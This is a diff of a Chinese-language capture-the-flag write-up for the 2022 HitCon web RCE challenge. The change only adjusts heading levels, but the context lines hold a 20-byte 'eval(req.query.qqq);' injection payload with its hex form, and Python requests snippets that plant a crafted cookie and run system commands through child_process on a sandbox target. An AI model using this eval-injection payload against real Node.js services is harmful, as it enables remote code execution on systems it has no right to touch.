@@ -2,7 +2,7 @@
 2022-HitCon-Web-rce
 :::
 
-# 1、思路
+## 1、思路
 
 本地部署：`npm install`，`node app.js`（⚠️：端口占用时修改监听端口）
 
@@ -66,9 +66,9 @@ app.get('/random', function (req, res) {
 });
 ```
 
-# 2、设置 cookie
+## 2、设置 cookie
 
-## 20 字节恶意代码
+### 20 字节恶意代码
 
 `req.query` 用在 get 请求当中，`req.body` 是用在 post 请求中的
 
@@ -78,7 +78,7 @@ app.get('/random', function (req, res) {
 
 由于 20 字节需要转换为 16 进制，所以 `eval(req.query.qqq);` => `6576616c287265712e71756572792e717171293b`
 
-## cookie 格式
+### cookie 格式
 
 ```python
 s = requests.get(url="http://challenge-9591aa6dad50d3ca.sandbox.ctfhub.com:10800")
@@ -117,7 +117,7 @@ while i < len(insert):
     i = i + 1
 ```
 
-## 执行系统命令
+### 执行系统命令
 
 Node.js 中使用 child_process 模块执行系统命令，并将结果转换为字符串
 
@@ -127,7 +127,7 @@ s = requests.get(url=url+f"?qqq={command}",cookies=cookies)
 print(s.text)
 ```
 
-# 3、exp
+## 3、exp
 
 ```python
 import requests
